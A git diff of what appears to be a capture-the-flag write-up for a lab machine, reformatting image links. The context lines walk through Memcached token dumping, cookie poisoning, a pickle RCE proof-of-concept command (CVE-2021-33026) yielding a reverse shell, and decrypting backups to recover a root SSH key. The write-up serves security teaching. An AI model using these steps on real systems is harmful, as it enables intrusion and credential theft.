@@ -44,15 +44,15 @@ Interesting.
 
 Port 80 looked rather static:
 
-<figure><img src="../../../.gitbook/assets/image (2223).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2223).png>)
 
 There was no public exploit for this software either, so let's move on. Port 5000 looked way more promising:
 
-<figure><img src="../../../.gitbook/assets/image (2148).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2148).png>)
 
 We can login, and there's no additional functionality with this website. Viewing the requests, we can see that the login just assigned us a token:
 
-<figure><img src="../../../.gitbook/assets/image (3658).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3658).png>)
 
 Moving to Memcache, we can dump it using `memcdump`. We instantly get loads of tokens:
 
@@ -83,7 +83,7 @@ Upgrade-Insecure-Requests: 1
 
 Interestingly, this cookie is stored in Memcached, indicating there's no cookie sanitisation there. Perhaps this could be poisoned?
 
-<figure><img src="../../../.gitbook/assets/image (3353).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3353).png>)
 
 ### Pickling RCE
 
@@ -116,7 +116,7 @@ $ python3 cve-2021-33026_PoC.py --rhost '192.168.202.59' --rport '5000' --cmd 'n
 
 We would get a shell on our listener port:
 
-<figure><img src="../../../.gitbook/assets/image (2222).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2222).png>)
 
 ## Privilege Escalation
 
@@ -189,26 +189,22 @@ Since the key is interpreted as a bytes type object, we need to convert it to he
 
 Then, we can decrypt the files:
 
-{% code overflow="wrap" %}
 ```
 jerry@shifty:~/backup$ openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in 3fa4dcd297e960dc9e875437c67e7817356c487f57f828453756a2cc -out decrypt
 ```
-{% endcode %}
 
 Then, we can bulk decrypt all of these files using a `bash` for loop:
 
-{% code overflow="wrap" %}
 ```bash
 for FILE in *; do openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in $FILE -out decrypt$FILE; rm $FILE; done
 ```
-{% endcode %}
 
 Then, we can read all of the files. Within the decrypted files, there was a SSH private key:
 
-<figure><img src="../../../.gitbook/assets/image (2615).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2615).png>)
 
 Using this, we can `ssh` in as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1698).png>)
 
 Rooted!
